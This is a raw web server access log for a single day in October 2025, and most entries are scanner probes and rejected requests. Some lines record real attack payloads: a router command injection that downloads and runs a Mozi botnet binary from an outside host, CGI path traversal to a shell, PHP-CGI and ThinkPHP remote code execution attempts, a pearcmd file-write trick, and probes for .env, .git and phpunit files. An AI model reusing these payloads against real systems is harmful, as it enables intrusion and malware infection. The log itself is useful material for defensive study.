166.88.169.207 - - [12/Oct/2025:06:21:24 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
87.121.84.17 - - [12/Oct/2025:07:12:17 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
43.157.43.147 - - [12/Oct/2025:07:23:50 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
93.174.93.12 - - [12/Oct/2025:07:46:19 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 150 "-" "-" "-"
34.77.159.182 - - [12/Oct/2025:08:07:23 +0000] "GET / HTTP/1.1" 400 154 "-" "python-requests/2.32.5" "-"
176.65.141.87 - - [12/Oct/2025:08:20:33 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "-"
87.121.84.17 - - [12/Oct/2025:08:53:40 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
209.226.130.75 - - [12/Oct/2025:09:16:06 +0000] "GET / HTTP/1.1" 400 154 "http://3.149.120.21" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
104.239.73.105 - - [12/Oct/2025:09:19:44 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
104.239.73.105 - - [12/Oct/2025:09:19:45 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
205.210.31.28 - - [12/Oct/2025:09:41:45 +0000] "GET / HTTP/1.0" 400 143 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
176.65.141.86 - - [12/Oct/2025:10:11:53 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 400 154 "-" "-" "-"
87.121.84.17 - - [12/Oct/2025:10:44:38 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
191.242.209.98 - - [12/Oct/2025:10:52:32 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
43.159.152.4 - - [12/Oct/2025:10:56:47 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
82.23.227.147 - - [12/Oct/2025:11:30:29 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
82.23.227.147 - - [12/Oct/2025:11:30:30 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
155.254.61.205 - - [12/Oct/2025:12:09:45 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
155.254.61.205 - - [12/Oct/2025:12:09:45 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
191.242.209.98 - - [12/Oct/2025:12:12:28 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
143.244.152.105 - - [12/Oct/2025:12:37:22 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0" "-"
20.64.104.2 - - [12/Oct/2025:12:41:54 +0000] "GET /ReportServer HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
87.121.84.17 - - [12/Oct/2025:12:44:14 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
20.65.195.37 - - [12/Oct/2025:13:18:22 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
43.133.69.37 - - [12/Oct/2025:13:20:03 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
87.120.191.84 - - [12/Oct/2025:13:41:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
103.160.196.202 - - [12/Oct/2025:14:06:30 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.160.196.202:57111/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 400 143 "-" "-" "-"
87.121.84.17 - - [12/Oct/2025:14:33:52 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
91.227.62.213 - - [12/Oct/2025:15:01:26 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
87.120.191.84 - - [12/Oct/2025:15:19:16 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
185.169.252.189 - - [12/Oct/2025:15:23:39 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
43.130.228.73 - - [12/Oct/2025:15:29:27 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
191.242.209.98 - - [12/Oct/2025:15:29:34 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
176.65.141.86 - - [12/Oct/2025:15:44:58 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 400 154 "-" "-" "-"
43.224.248.61 - - [12/Oct/2025:15:55:25 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 150 "-" "-" "-"
43.224.248.61 - - [12/Oct/2025:15:55:27 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 150 "-" "-" "-"
43.224.248.61 - - [12/Oct/2025:15:55:28 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:29 +0000] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:30 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:31 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:32 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:33 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:34 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:35 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:36 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:37 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:38 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:39 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:40 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:41 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:42 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:43 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:44 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:45 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:46 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:47 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:48 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:49 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:50 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:51 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:52 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:53 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:54 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:55 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:56 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:57 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:58 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:55:59 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:00 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:01 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:02 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:03 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:04 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:05 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:06 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:07 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:08 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:09 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:10 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 400 154 "-" "libredtail-http" "-"
43.224.248.61 - - [12/Oct/2025:15:56:11 +0000] "GET /containers/json HTTP/1.1" 400 154 "-" "libredtail-http" "-"
87.121.84.17 - - [12/Oct/2025:16:02:09 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
44.243.8.71 - - [12/Oct/2025:16:08:53 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36" "-"
108.165.161.77 - - [12/Oct/2025:16:27:56 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
108.165.161.77 - - [12/Oct/2025:16:27:56 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
43.133.142.141 - - [12/Oct/2025:17:00:06 +0000] "GET /.git/config HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" "-"
103.105.208.136 - - [12/Oct/2025:17:00:33 +0000] "GET /admin/config.php HTTP/1.0" 400 143 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
87.120.191.84 - - [12/Oct/2025:17:06:20 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
176.65.141.87 - - [12/Oct/2025:17:15:17 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "-"
54.159.11.214 - - [12/Oct/2025:17:22:11 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
204.76.203.212 - - [12/Oct/2025:17:33:47 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
142.93.190.64 - - [12/Oct/2025:17:59:23 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
204.76.203.219 - - [12/Oct/2025:18:16:20 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
3.130.96.91 - - [12/Oct/2025:18:21:09 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.130.96.91 - - [12/Oct/2025:18:23:17 +0000] "" 400 0 "-" "-" "-"
3.130.96.91 - - [12/Oct/2025:18:24:16 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD7or7\x8F\xD8m\x05K\xEE\x0F\x10\xCB\xB3\xC6\xFA\xEF~0Z\xA8\xF8\xEAJ\x8C\xF4-S\x8C\xCEh\xEE\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
3.130.96.91 - - [12/Oct/2025:18:24:59 +0000] "SSH-2.0-Go" 400 150 "-" "-" "-"
3.130.96.91 - - [12/Oct/2025:18:26:18 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03@\x04\xF4\xBA[\xA96\xD8\x1F\xD3\x9F\x8F\xBE*\x90V\xCD\xB5\x1F\x13n\xC3\xB9\x09`A\xDF\x88" 400 150 "-" "-" "-"
87.120.191.84 - - [12/Oct/2025:18:40:49 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
104.252.92.229 - - [12/Oct/2025:19:27:29 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
104.252.92.229 - - [12/Oct/2025:19:27:30 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
87.121.84.17 - - [12/Oct/2025:19:38:01 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
87.120.191.84 - - [12/Oct/2025:20:13:54 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
213.209.157.162 - - [12/Oct/2025:20:28:34 +0000] "GET /.git/HEAD HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0" "-"
204.76.203.219 - - [12/Oct/2025:20:29:23 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
176.65.141.86 - - [12/Oct/2025:21:03:04 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 400 154 "-" "-" "-"
93.174.93.12 - - [12/Oct/2025:21:10:08 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (iPad; CPU OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/76.0.3809.81 Mobile/15E148 Safari/605.1" "-"
82.21.244.109 - - [12/Oct/2025:21:15:25 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
82.21.244.109 - - [12/Oct/2025:21:15:26 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
102.129.152.57 - - [12/Oct/2025:21:31:03 +0000] "GET /.env HTTP/1.1" 400 154 "-" "python-requests/2.26.0" "-"
102.129.152.57 - - [12/Oct/2025:21:31:04 +0000] "POST / HTTP/1.1" 400 154 "-" "python-requests/2.26.0" "-"
91.224.92.17 - - [12/Oct/2025:21:33:39 +0000] "GET / HTTP/1.1" 400 154 "-" "-" "-"
185.242.226.110 - - [12/Oct/2025:21:34:10 +0000] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\xB53\xBF\x13\xD76\x96Ec\xB95\xC2\xBE\xCDqb\xEFf\x1A\x9B\xC3?\x9F\xD7\x1C\xF7\xFE" 400 150 "-" "-" "-"
176.65.141.87 - - [12/Oct/2025:21:41:45 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "-"
87.121.84.17 - - [12/Oct/2025:21:58:13 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
204.76.203.219 - - [12/Oct/2025:22:12:15 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
93.174.93.12 - - [12/Oct/2025:22:17:04 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 150 "-" "-" "-"
87.120.191.84 - - [12/Oct/2025:22:40:25 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
20.118.32.59 - - [12/Oct/2025:22:50:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
24.46.60.29 - - [12/Oct/2025:23:28:04 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
24.46.60.29 - - [12/Oct/2025:23:28:04 +0000] "GET /assets/index-CkNa97w_.js HTTP/1.1" 304 0 "http://safeeats-app-env.eba-nknmey2d.us-east-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
24.46.60.29 - - [12/Oct/2025:23:28:04 +0000] "GET /assets/index-Bo8_gSxg.css HTTP/1.1" 304 0 "http://safeeats-app-env.eba-nknmey2d.us-east-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "-"
